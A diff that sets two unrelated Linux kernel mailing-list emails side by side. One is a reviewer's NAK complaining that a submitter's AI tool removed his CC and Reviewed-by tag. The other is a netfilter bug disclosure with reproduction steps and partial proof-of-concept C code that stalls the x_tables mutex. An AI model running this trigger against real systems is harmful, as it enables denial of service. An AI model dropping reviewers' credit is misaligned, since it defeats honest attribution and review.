@@ -1,317 +1,935 @@
-Received: from mail.mainlining.org (mail.mainlining.org [5.75.144.95])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pz2-f36.google.com (mail-pz2-f36.google.com [74.125.228.36])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 540F1347BA9;
-	Sun, 20 Sep 2026 11:56:30 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=5.75.144.95
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CF46D39B4BF
+	for <linux-kernel@vger.kernel.org>; Sun, 20 Sep 2026 11:58:44 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.36
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789905392; cv=none; b=R/jTKts9lxieRF7qbH7uUjhmtlKhAP8Gug1NkqwFeAII+8+H7dBzHUR0M+HEjLhI9YXo728+H9nftB3MEGF/FgZWXrwDxWKEy+psaGlfmaelhXJt4C3KBriEe4nZppVdvGD6pnY4uj/2EQeDOWFlNbgF/iAO+5vJU4DVvguiF6A=
+	t=1789905527; cv=none; b=aTzC7meqPSidkT6A/uzhujOPiajs5EBNYldAxzQw/v2PY//SxnJRbTK8B4EwLEU2hS+woV4OzxgoLJBsZG3lL9eixx2wVHGy1e6Ucdzbxqg2mJCdPR2lgSoUOo/u/IUCXwNUa8A6KfcdonkreO34BQ0JL2mSOhpCpMFZSDJv8MM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789905392; c=relaxed/simple;
-	bh=ZIPYjqYciGVphhbYnTgn5E+0Kyitjs4W/8Qb8mOv2gA=;
-	h=Date:From:To:CC:Subject:In-Reply-To:Message-ID:MIME-Version:
-	 Content-Type; b=jkC9yLn36+lcnmL7u42F7wNNSva139jrjXymPc0V94XzLHpJ9hYkQu1lc3P0bOX9bZQiTLwskmLUo49mb0hxNXL2qfItq6NcvTE/PszIkgnxV+qJ7sn3CiAUnQGe29z4nUTwFrNELy2PGcFn9MpsoZ6IlWCgLyACDA/NlIijJY4=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=mainlining.org; spf=pass smtp.mailfrom=mainlining.org; dkim=pass (2048-bit key) header.d=mainlining.org header.i=@mainlining.org header.b=owqherd3; dkim=permerror (0-bit key) header.d=mainlining.org header.i=@mainlining.org header.b=zByV/oKc; arc=none smtp.client-ip=5.75.144.95
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=mainlining.org
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=mainlining.org
+	s=arc-20240116; t=1789905527; c=relaxed/simple;
+	bh=gNb48zuGScLvMqZ/w7dAwzIDq9jnP2FrvxIntIqdP+c=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=MPMO0fSZS3AQtYKQcrbVX5FxOyelBdih+4Uk0AE1ZhZLm7Ai9zziEwH87xvGpYRVk0CoauEhcJYlfAZjcN2egVL2kzRFpDDMsIVyUytFYYQUQ+gCFZ7wElr0VEP7DcYXdP7IEFRmEWGrDLqfull2Mqw4RGk8IwHol7zt67MsrLw=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=QDeS+Zps; arc=none smtp.client-ip=74.125.228.36
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=mainlining.org header.i=@mainlining.org header.b="owqherd3";
-	dkim=permerror (0-bit key) header.d=mainlining.org header.i=@mainlining.org header.b="zByV/oKc"
-DKIM-Signature: v=1; a=rsa-sha256; s=202507r; d=mainlining.org; c=relaxed/relaxed;
-	h=Message-ID:Subject:To:From:Date; t=1789905387; bh=YUmmqfrOHURhxdHBd/AfXiT
-	B6Cxf0E05PkLPnMSDFIY=; b=owqherd3hZQtNypTLYbSCkNC16Zl5rZxu5Mv+P7OAAuXo+UvGn
-	KnsoqPtf+NGmSW52LwLR8wD/lw7uT8hDLy8uVlrbPOL0+955Rv4Otfc8CfOcaVtqBWm/G74GI1x
-	Ws8qYylE7o6IAInd9tfc+A/ZtOo1HY0ZPsubPUHSKQkPgl9t06EwMflRyUCSUjpNaJj8Fbuib4e
-	Wy1xbzl5F9RztB/vBjjgd/TZ8NQaKqF55qrkJKBz1VHKHCn33l33p0VPnW7DCwXlZPfDFUOxJsT
-	dW1+sOzntCj27XUWBb53yD13QyHQ+T4LulVEWmh56m0daP1som0ToLMcuHzLt8CshTw==;
-DKIM-Signature: v=1; a=ed25519-sha256; s=202507e; d=mainlining.org; c=relaxed/relaxed;
-	h=Message-ID:Subject:To:From:Date; t=1789905387; bh=YUmmqfrOHURhxdHBd/AfXiT
-	B6Cxf0E05PkLPnMSDFIY=; b=zByV/oKcQpZABHhCNjtvcz1t3vt4yecgRe3aTnfhgbHrzB4Scd
-	f+H8YjHT4/mkzy5XtFm80rz5gqZV6uEydaAw==;
-Date: Sun, 20 Sep 2026 12:56:27 +0100
-From: Bradley Morgan <brads@mainlining.org>
-To: benquike@gmail.com
-CC: kees@kernel.org, linux-kernel@vger.kernel.org,
- linux-kselftest@vger.kernel.org, luto@amacapital.net, shuah@kernel.org,
- wad@chromium.org
-Subject: =?US-ASCII?Q?Re=3A_=5BPATCH_v3=5D_seccomp=3A_restore_knotif-=3Estat?=
- =?US-ASCII?Q?e_when_SECCOMP=5FADDFD=5FFLAG=5FSEND_is_interrupted?=
-In-Reply-To: <20260920072036.3888061-1-benquike@gmail.com>
-Message-ID: <A3F8F45D-3B9B-4E52-B076-7924FF3AF360@mainlining.org>
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="QDeS+Zps"
+Received: by mail-pz2-f36.google.com with SMTP id 41be03b00d2f7-cc1cea34f01so1799529a12.1
+        for <linux-kernel@vger.kernel.org>; Sun, 20 Sep 2026 04:58:44 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1789905524; x=1790510324; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=prTuYvzyctOVHgCM17GNyKDBMAh2RICLOObz9ueJi54=;
+        b=QDeS+ZpsQDfTlvYzG5nf3P5nRTFu8gB0sKvIFZbbqEJHSmpZzDoiZcVC09ShcV/zC5
+         qwkUtNy42NavJgx/WBEOnMucj8XLQGxdRIqX/uR/zeEyB0Y4XoEcHS6PhehtXw+bILlG
+         6Zhjtl1oVO+UGE15BrdiVTe6h4ylimsTQ9SGpxvJ9gJMbJOQtt7rj6IPAbUMFWnOsdlR
+         nAkMt6VyiAmJbZgStGDj/QuYTqXy6UttE+l4uG7vZNPCO1jkiWM+UYsT+A+wTR32ogQz
+         tr/8yv2hMT4nnldRZJU31Ajnc1v1JQz0eWnwDRvDAqEyyHqA6JsmiHXMNQaCYLNSz646
+         rQOQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1789905524; x=1790510324;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=prTuYvzyctOVHgCM17GNyKDBMAh2RICLOObz9ueJi54=;
+        b=PoXbTfnubKIXGTb3+bU0IWve/fMTAfvjiTlVVwaazpEFYAoRFH48Ij40129sL4l/Yo
+         HmsgqEMX0sq/qHKKb+E7HrO5wmJDwcJZPDEKZADZO0hp7AK1YI2XG3XvboB7SBmcIGPB
+         r6PcI8q6iOJ97iTyWMRcEx5C3wwMxn4rqoRucU9klvH4TY8s4t54aOrcYKi6frORkEsA
+         HAlSMU/ai/Z32VpdgxHMD6uVltCur6sz5BozX3xCK8tRmp6cP+tV2IXw7KKID0wAkpaW
+         PExOxpTmqRiDpXMgbBCr/GskhnjotFgcF4/4ZTWN5IXiglkcN8YO/+YlESdh7Ok0k1Zu
+         4cZw==
+X-Forwarded-Encrypted: i=1; AKwUvBzEO6n6x6anwuhxgiFH56C+ptJrdZJjZkmi2VcK+yhtJ2Yh+dsv+hsLmNZvf9ATbvLNxce/duz6gIdSPpU=@vger.kernel.org
+X-Gm-Message-State: AFuF++kdKZAaW1QH6hAWkl+kRx8VShPoMGDCayh4W7gjohqRbeb5VdPS
+	6byiDDConbdWvlLC+oZIhSshBPr5qy5vC2c2eYPbkLgWXMK0VHPPAghcuT4O/XoqxCZ3
+X-Gm-Gg: AYBFou1Leccscei/DCDCCje2BCaGzprNoZWskhEmUro2h3bDYjiBFQt+kJ8RTCCDlsn
+	7y/4DJ7W20pod3Krglkda7Xv7Tjh7KLaw1sLdGKfgF6M82cnVvWSkdFrw56VJ8jXyyEtwHHWFw4
+	dyRQ/Bj7q2Sp0boWCGBIygDlNhc1L55GR0o/gkvJM0rEhveVbJ5la8AFJez+e88FAyx773GfMRK
+	CxXyDKw4TdMJQylRMUmW5VlcDajPBLWEzH3S8VjEjuTAo7anaFymK6bdYbXrTrDLkmvsmSOIb5f
+	hBG0yYGkNl58FU0otM6/ccRwkT3iyr1WGsbtV0dXIVb8reeN4pxansfpjeuq29N5t4Z2MOFN0Qb
+	vipS/AeNUi42K33YYqxPe1xftIHsCOnxWL7og0edxvp4bTitv58bE2uMpq9+JmZ5IzAP7GBEAk7
+	xnLB+ti/O1ntYB2IIMnHj52c1SOBTUq4oDV0vRsPdkNosLdZRrOhMXQaf7OpyXjPMWEVCrp5f7/
+	9CykdFbh5u/xvtv9rMwtcq64TegAw4/aYXHoib5
+X-Received: by 2002:a17:90b:4a0c:b0:3a0:345a:3634 with SMTP id 98e67ed59e1d1-3a0345a4a05mr2684971a91.41.1789905523843;
+        Sun, 20 Sep 2026 04:58:43 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6c37c8e7sm8736746a91.9.2026.09.20.04.58.39
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sun, 20 Sep 2026 04:58:42 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netfilter-devel@vger.kernel.org
+Cc: Zihan Xi <zihanx@nebusec.ai>,
+	coreteam@netfilter.org,
+	pablo@netfilter.org,
+	fw@strlen.de,
+	phil@nwl.cc,
+	netdev@vger.kernel.org,
+	linux-kernel@vger.kernel.org,
+	davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org
+Subject: [PATCH nf v3 0/1] netfilter: x_tables: avoid holding mutex over faultable user copies
+Date: Sun, 20 Sep 2026 11:58:21 +0000
+Message-ID: <cover.1789885804.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain;
- charset=utf-8
 Content-Transfer-Encoding: 8bit
 
-On 20 September 2026 08:20:36 BST, Hui Peng <benquike@gmail.com> wrote:
->In seccomp_notify_addfd(), when SECCOMP_ADDFD_FLAG_SEND is set in
->addfd.flags, knotif->state is optimistically transitioned from
->SECCOMP_NOTIFY_SENT to SECCOMP_NOTIFY_REPLIED before waking the tracee
->and waiting on kaddfd.completion:
->
->	if (addfd.flags & SECCOMP_ADDFD_FLAG_SEND) {
->		knotif->state = SECCOMP_NOTIFY_REPLIED;
->		...
->	}
->
->If wait_for_completion_interruptible(&kaddfd.completion) is interrupted
->by a signal before the tracee dequeues the kaddfd request
->(!list_empty(&kaddfd.list)), seccomp_notify_addfd() removes kaddfd from
->knotif->addfd and returns -EINTR to the supervisor without having
->installed the file descriptor.
->
->However, knotif->state is left as SECCOMP_NOTIFY_REPLIED (with
->knotif->error == 0 and knotif->val == 0). This causes two problems:
->
->1. When the tracee runs in do_user_notif(), it checks
->   if (knotif.state != SECCOMP_NOTIFY_REPLIED) after calling
->   seccomp_handle_addfd(). Because knotif->state is already
->   SECCOMP_NOTIFY_REPLIED, the tracee exits the notification wait loop
->   prematurely and returns 0 from the trapped syscall without the file
->   descriptor ever having been installed.
->
->2. If the supervisor retries SECCOMP_IOCTL_NOTIF_ADDFD or
->   SECCOMP_IOCTL_NOTIF_SEND before the tracee runs, it fails with
->   -EINPROGRESS because knotif->state is no longer SECCOMP_NOTIFY_SENT.
->
->Fix this by restoring knotif->state back to SECCOMP_NOTIFY_SENT if
->SECCOMP_ADDFD_FLAG_SEND was set and kaddfd was not consumed before the
->interrupted wait. Also add a seccomp_bpf selftest
->(user_notification_addfd_send_interrupted) covering this race.
->
->Fixes: 0ae71c1990f3 ("seccomp: Add a flag to atomically addfd and perform send")
+Hi Linux kernel maintainers,
 
-Oh my godd you
+We found and validated an issue in net/ipv4/netfilter/arp_tables.c. The
+same lock-scope pattern is present in net/ipv4/netfilter/ip_tables.c and
+net/ipv6/netfilter/ip6_tables.c. The ARP FUSE path was the only runtime
+trigger exercised. The IPv4 and IPv6 paths were checked by source inspection,
+but were not separately exercised. A non-root user can trigger the ARP path
+after creating a private user and network namespace, where the process has
+CAP_NET_ADMIN, using a FUSE-backed output buffer. In the tested setup, the
+normal-buffer GET_INFO check continued to succeed on both the unfixed and
+fixed kernels. The change is limited to these legacy table-read paths. In
+our tests, other functionality remained unaffected; the fixed run produced
+no new Oops, BUG, WARNING or kernel panic in the collected dmesg tail.
 
-1: removed me from CC
-2: removed my R-B tag!
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-What is your AI doing!
+---- details below ----
 
-NAK. I can't review something like this!
+Bug details:
 
-Add a assisted by tag and CC me and I'll look at it
+The legacy IPv4, IPv6 and ARP GET_INFO and GET_ENTRIES handlers acquire
+xt[AF_INET], xt[AF_INET6] or xt[NFPROTO_ARP].mutex before copying table
+data to userspace. A faultable output page can sleep while that global
+per-family mutex is held, blocking operations that need the same family
+mutex. Our cross-network-namespace run observed a GET_INFO waiter blocked
+on that mutex. The access check is ns_capable(sock_net(sk)->user_ns,
+CAP_NET_ADMIN).
 
+The tested FUSE path is reachable by a non-root user after unshare -Urn;
+the FUSE mount itself is made in the initial namespace because mounting
+FUSE from the nested namespace was not permitted. The standalone poc.c
+userfaultfd variant is separate from this FUSE path and requires root in
+this guest because vm.unprivileged_userfaultfd=0.
+The FUSE path was run only for ARP. The IPv4 and IPv6 changes are based
+on source inspection of the same lock scope; no separate IPv4/IPv6 runtime
+test was run.
 
->Signed-off-by: Hui Peng <benquike@gmail.com>
->---
->Changes in v3:
->- Actually include the tools/testing/selftests/seccomp/seccomp_bpf.c
->  regression test in the patch diff (v2 accidentally omitted the selftest
->  hunk), with detailed comments explaining the race and test setup.
->
->Changes in v2:
->- Add user_notification_addfd_send_interrupted regression test to
->  tools/testing/selftests/seccomp/seccomp_bpf.c as requested by Kees Cook.
->
-> kernel/seccomp.c                              |   2 +
-> tools/testing/selftests/seccomp/seccomp_bpf.c | 161 ++++++++++++++++++
-> 2 files changed, 163 insertions(+)
->
->diff --git a/kernel/seccomp.c b/kernel/seccomp.c
->index 86cf4460d69e..94c7ba80a8f7 100644
->--- a/kernel/seccomp.c
->+++ b/kernel/seccomp.c
->@@ -1808,10 +1808,13 @@ static long seccomp_notify_addfd(struct seccomp_filter *filter,
-> 	 * We need to check again if the addfd request has been handled,
-> 	 * and if not, we will remove it from the queue.
-> 	 */
->-	if (list_empty(&kaddfd.list))
->+	if (list_empty(&kaddfd.list)) {
-> 		ret = kaddfd.ret;
->-	else
->+	} else {
-> 		list_del(&kaddfd.list);
->+		if (addfd.flags & SECCOMP_ADDFD_FLAG_SEND)
->+			knotif->state = SECCOMP_NOTIFY_SENT;
->+	}
-> 
-> out_unlock:
-> 	mutex_unlock(&filter->notify_lock);
->diff --git a/tools/testing/selftests/seccomp/seccomp_bpf.c b/tools/testing/selftests/seccomp/seccomp_bpf.c
->index 0622bc2acad4..e565728f9eb2 100644
->--- a/tools/testing/selftests/seccomp/seccomp_bpf.c
->+++ b/tools/testing/selftests/seccomp/seccomp_bpf.c
->@@ -4368,6 +4368,173 @@ TEST(user_notification_addfd_rlimit)
-> 	close(memfd);
-> }
-> 
->+static void sigusr1_handler(int signo)
->+{
->+}
->+
->+/*
->+ * Verify that when SECCOMP_IOCTL_NOTIF_ADDFD with SECCOMP_ADDFD_FLAG_SEND is
->+ * interrupted by a signal before the tracee dequeues the addfd request,
->+ * knotif->state is restored from SECCOMP_NOTIFY_REPLIED back to
->+ * SECCOMP_NOTIFY_SENT so that:
->+ *   1. The woken tracee sees knotif->state == SECCOMP_NOTIFY_SENT in
->+ *      do_user_notif() and goes back to sleep instead of prematurely
->+ *      returning 0 from the trapped syscall without the FD installed.
->+ *   2. The supervisor can retry SECCOMP_IOCTL_NOTIF_ADDFD (or
->+ *      SECCOMP_IOCTL_NOTIF_SEND) instead of failing with -EINPROGRESS.
->+ *
->+ * To deterministically hit the race window where the supervisor sleeps in
->+ * wait_for_completion_interruptible(&kaddfd.completion) after waking the
->+ * tracee (complete(&knotif->ready)) but before the tracee runs
->+ * seccomp_handle_addfd(), pin all processes to a single CPU and enforce a
->+ * strict 3-tier scheduling priority hierarchy on that CPU:
->+ *   - Supervisor:            SCHED_FIFO priority 99 (highest)
->+ *   - Signal helper (sig_pid): SCHED_FIFO priority 50 (middle)
->+ *   - Tracee (pid):          SCHED_IDLE             (lowest)
->+ */
->+TEST(user_notification_addfd_send_interrupted)
->+{
->+	/*
->+	 * Save parent_pid before user_notif_syscall(__NR_getppid, ...) installs
->+	 * the seccomp filter on the calling process; children inherit that
->+	 * filter, so sig_pid must not call getppid().
->+	 */
->+	pid_t pid, sig_pid, parent_pid = getpid();
->+	long ret;
->+	int status, listener, memfd;
->+	struct seccomp_notif_addfd addfd = {};
->+	struct seccomp_notif req = {};
->+	struct sigaction sa = {};
->+	struct sched_param sp_tracee_idle = { .sched_priority = 0 };
->+	struct sched_param sp_supervisor_fifo = { .sched_priority = 99 };
->+	struct sched_param sp_sig_helper_fifo = { .sched_priority = 50 };
->+	struct timespec delay = { .tv_nsec = 15000000 };
->+	cpu_set_t cpuset;
->+	int cpu;
->+
->+	/* Pin the supervisor (and its future child processes) to one CPU. */
->+	cpu = sched_getcpu();
->+	if (cpu >= 0) {
->+		CPU_ZERO(&cpuset);
->+		CPU_SET(cpu, &cpuset);
->+		sched_setaffinity(0, sizeof(cpuset), &cpuset);
->+	}
->+
->+	sa.sa_handler = sigusr1_handler;
->+	ASSERT_EQ(sigaction(SIGUSR1, &sa, NULL), 0);
->+
->+	memfd = memfd_create("test", 0);
->+	ASSERT_GE(memfd, 0);
->+
->+	ret = prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
->+	ASSERT_EQ(0, ret) {
->+		TH_LOG("Kernel does not support PR_SET_NO_NEW_PRIVS!");
->+	}
->+
->+	/*
->+	 * Follow the convention of other user_notification_* tests in this
->+	 * file by trapping __NR_getppid: because the filter is installed on
->+	 * the supervisor before fork(), the trapped syscall must be a
->+	 * side-effect-free syscall that the supervisor itself never invokes.
->+	 * Even though getppid() does not normally return an FD,
->+	 * SECCOMP_ADDFD_FLAG_SEND replaces the trapped syscall's return value
->+	 * with the newly installed FD number (42).
->+	 */
->+	listener = user_notif_syscall(__NR_getppid,
->+				      SECCOMP_FILTER_FLAG_NEW_LISTENER);
->+	ASSERT_GE(listener, 0);
->+
->+	pid = fork();
->+	ASSERT_GE(pid, 0);
->+
->+	if (pid == 0) {
->+		/*
->+		 * Tracee: invoke __NR_getppid as a dummy trigger syscall to
->+		 * trap into do_user_notif(). Verify that the syscall returns
->+		 * the injected FD number (42) and that FD 42 is open.
->+		 */
->+		ret = syscall(__NR_getppid);
->+		exit(ret != 42 || fcntl(42, F_GETFD) < 0);
->+	}
->+
->+	/* Wait for the tracee to trap in do_user_notif(). */
->+	ASSERT_EQ(ioctl(listener, SECCOMP_IOCTL_NOTIF_RECV, &req), 0);
->+
->+	/*
->+	 * Demote the tracee to SCHED_IDLE and promote the supervisor to
->+	 * SCHED_FIFO(99) on the same CPU.
->+	 */
->+	sched_setscheduler(pid, SCHED_IDLE, &sp_tracee_idle);
->+	if (sched_setscheduler(0, SCHED_FIFO, &sp_supervisor_fifo) != 0) {
->+		close(listener);
->+		close(memfd);
->+		kill(pid, SIGKILL);
->+		waitpid(pid, NULL, 0);
->+		SKIP(return, "SCHED_FIFO requires CAP_SYS_NICE");
->+	}
->+
->+	addfd.srcfd = memfd;
->+	addfd.newfd_flags = O_CLOEXEC;
->+	addfd.newfd = 42;
->+	addfd.id = req.id;
->+	addfd.flags = SECCOMP_ADDFD_FLAG_SETFD | SECCOMP_ADDFD_FLAG_SEND;
->+
->+	/*
->+	 * Fork a signal helper on the same CPU and set it to SCHED_FIFO(50).
->+	 * Because the supervisor is currently running at SCHED_FIFO(99) on
->+	 * this CPU, sig_pid is queued on the runqueue but cannot run until the
->+	 * supervisor blocks inside the kernel.
->+	 *
->+	 * When the supervisor invokes ioctl(SECCOMP_IOCTL_NOTIF_ADDFD) below:
->+	 *   1. seccomp_notify_addfd() sets knotif->state = SECCOMP_NOTIFY_REPLIED,
->+	 *      wakes the tracee (SCHED_IDLE), and blocks in
->+	 *      wait_for_completion_interruptible(&kaddfd.completion).
->+	 *   2. The CPU scheduler immediately runs sig_pid (SCHED_FIFO 50)
->+	 *      ahead of the woken tracee (SCHED_IDLE).
->+	 *   3. sig_pid sends SIGUSR1 to parent_pid, waking the supervisor
->+	 *      (SCHED_FIFO 99), which immediately preempts sig_pid, aborts the
->+	 *      wait with -ERESTARTSYS (-EINTR), removes kaddfd from
->+	 *      knotif->addfd, and restores knotif->state = SECCOMP_NOTIFY_SENT
->+	 *      before the tracee has executed a single instruction.
->+	 */
->+	sig_pid = fork();
->+	ASSERT_GE(sig_pid, 0);
->+	if (sig_pid == 0) {
->+		sched_setscheduler(0, SCHED_FIFO, &sp_sig_helper_fifo);
->+		kill(parent_pid, SIGUSR1);
->+		_exit(0);
->+	}
->+
->+	EXPECT_EQ(ioctl(listener, SECCOMP_IOCTL_NOTIF_ADDFD, &addfd), -1);
->+	EXPECT_EQ(errno, EINTR);
->+	EXPECT_EQ(waitpid(sig_pid, &status, 0), sig_pid);
->+
->+	/*
->+	 * Restore normal scheduling and sleep briefly so the woken tracee
->+	 * runs in do_user_notif(). With knotif->state restored to
->+	 * SECCOMP_NOTIFY_SENT, the tracee must loop back to sleep waiting for
->+	 * the notification reply rather than returning 0 from __NR_getppid.
->+	 */
->+	sched_setscheduler(0, SCHED_OTHER, &sp_tracee_idle);
->+	sched_setscheduler(pid, SCHED_OTHER, &sp_tracee_idle);
->+	nanosleep(&delay, NULL);
->+
->+	/*
->+	 * Retry SECCOMP_IOCTL_NOTIF_ADDFD. Because knotif->state is
->+	 * SECCOMP_NOTIFY_SENT, the retry succeeds (returns 42) instead of
->+	 * failing with -EINPROGRESS, installs FD 42 into the tracee, and wakes
->+	 * the tracee to complete the syscall with return value 42.
->+	 */
->+	EXPECT_EQ(ioctl(listener, SECCOMP_IOCTL_NOTIF_ADDFD, &addfd), 42);
->+
->+	EXPECT_EQ(waitpid(pid, &status, 0), pid);
->+	EXPECT_EQ(true, WIFEXITED(status));
->+	EXPECT_EQ(0, WEXITSTATUS(status));
->+
->+	close(listener);
->+	close(memfd);
->+}
->+
-> #ifndef SECCOMP_USER_NOTIF_FD_SYNC_WAKE_UP
-> #define SECCOMP_USER_NOTIF_FD_SYNC_WAKE_UP (1UL << 0)
-> #define SECCOMP_IOCTL_NOTIF_SET_FLAGS  SECCOMP_IOW(4, __u64)
->
+The lock scope is present in 1da177e4c3f4 ("Linux-2.6.12-rc2"), which is
+the earliest available Git snapshot. That commit has no parent, so a
+first introduction before Git cannot be proven. Later namespace support
+changed reachability, but does not establish a later introduction of the
+root-cause fact; the historical conclusion therefore remains uncertain.
 
---- Thanks!
-"I'm not a very positive person" - Linus torvalds
+The locked copy now disables page faults. GET_ENTRIES first validates
+the table and requested size while holding the family mutex, then releases
+it before fault_in_safe_writeable() touches the output range. It reacquires
+the mutex and revalidates the table and requested size before the nofault
+copy. If the nofault copy fails, the initial attempt is followed by at most
+three retries; each retry faults the range outside the lock. A failed fault-in
+returns -EFAULT immediately; a mapping that keeps changing returns -EFAULT
+after four nofault attempts. No retry takes place while the mutex is held.
+This handles the common first fault before alloc_counters()/get_counters()
+runs, so it avoids a discarded counter snapshot. GET_INFO copies its
+fixed-size result after unlocking, and the same fault-safe handling covers
+the IPv4/IPv6 compat GET_ENTRIES paths.
+
+The nofault GET_ENTRIES copy still runs under the family mutex; the fix
+removes faultable user-page waits, not the duration of the locked copy.
+
+ebtables GET uses the separate ebt_mutex and is outside this
+IPv4/IPv6/ARP series. GET_ENTRIES can still perform kernel-side
+alloc_counters()/vzalloc() and cond_resched() work under its mutex; the
+patch removes the user-controlled fault wait, not every lock-held sleep.
+
+Reproducer:
+
+The following files must be saved with these exact names in one directory.
+The commands below build all helpers and run the FUSE/user-namespace path.
+Run the package-install commands as root, then run make, chmod, and poc.sh as
+a non-root user with access to /dev/fuse. The user-namespace trigger binary
+is named poc-userns-trig; the FUSE helper binary is fuse_stall.
+
+    mkdir -p /tmp/xtables-poc
+    cd /tmp/xtables-poc
+    apt-get update
+    apt-get install -y fuse3 libfuse3-dev pkg-config gcc make
+    make
+    chmod +x poc.sh
+    ./poc.sh
+
+The holder's GET_ENTRIES output points at the FUSE-backed page. On an
+unpatched kernel it reaches folio_wait_bit_common while holding the
+xtables mutex, and a GET_INFO waiter in the other network namespace
+reaches xt_find_table_lock. With v3, table and size validation precede
+fault-in, and an -EFAULT from the nofault copy can trigger a bounded retry
+after the mutex is released, so the waiter does not remain blocked on the
+mutex.
+
+For completeness, run the standalone userfaultfd path from a root shell:
+
+    gcc -O2 -static -o poc poc.c
+    ./poc
+
+The validation used a 2 vCPU, 2 GiB RAM x86 QEMU guest. The latest fixed
+run used TCG because KVM was unavailable in the test environment.
+
+    qemu-system-x86_64 -machine accel=tcg -smp 2 -m 2G
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/netfilter_arp/arp_tables.h>
+#include <linux/userfaultfd.h>
+#include <netinet/in.h>
+#include <poll.h>
+#include <sched.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/prctl.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#ifndef ARRAY_SIZE
+#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
+#endif
+
+static const char *table_name = "filter";
+
+static void die(const char *msg)
+{
+	perror(msg);
+	exit(EXIT_FAILURE);
+}
+
+static int make_ipv4_sock(void)
+{
+	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	if (fd < 0)
+		die("socket(AF_INET, SOCK_DGRAM)");
+	return fd;
+}
+
+static unsigned int fetch_table_size(void)
+{
+	struct arpt_getinfo info;
+	socklen_t len = sizeof(info);
+	int fd = make_ipv4_sock();
+
+	memset(&info, 0, sizeof(info));
+	strncpy(info.name, table_name, sizeof(info.name) - 1);
+
+	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) < 0)
+		die("getsockopt(ARPT_SO_GET_INFO)");
+	if (len != sizeof(info)) {
+		fprintf(stderr, "unexpected ARPT_SO_GET_INFO length %u\n",
+			(unsigned int)len);
+		exit(EXIT_FAILURE);
+	}
+
+	close(fd);
+	return info.size;
+}
+
+static int setup_userfaultfd(void *addr, size_t len)
+{
+	struct uffdio_api api;
+	struct uffdio_register reg;
+	int uffd;
+
+	uffd = syscall(SYS_userfaultfd, 0);
+	if (uffd < 0)
+		die("userfaultfd");
+
+	memset(&api, 0, sizeof(api));
+	api.api = UFFD_API;
+	if (ioctl(uffd, UFFDIO_API, &api) < 0)
+		die("UFFDIO_API");
+
+	memset(&reg, 0, sizeof(reg));
+	reg.range.start = (unsigned long)addr;
+	reg.range.len = len;
+	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
+	if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0)
+		die("UFFDIO_REGISTER");
+
+	return uffd;
+}
+
+static void hang_in_get_entries(unsigned int table_size)
+{
+	size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+	size_t data_len = (table_size + page_size - 1) & ~(page_size - 1);
+	size_t map_len = page_size + data_len;
+	char *mapping;
+	struct arpt_get_entries *get;
+	socklen_t len;
+	int fd;
+	int uffd;
+
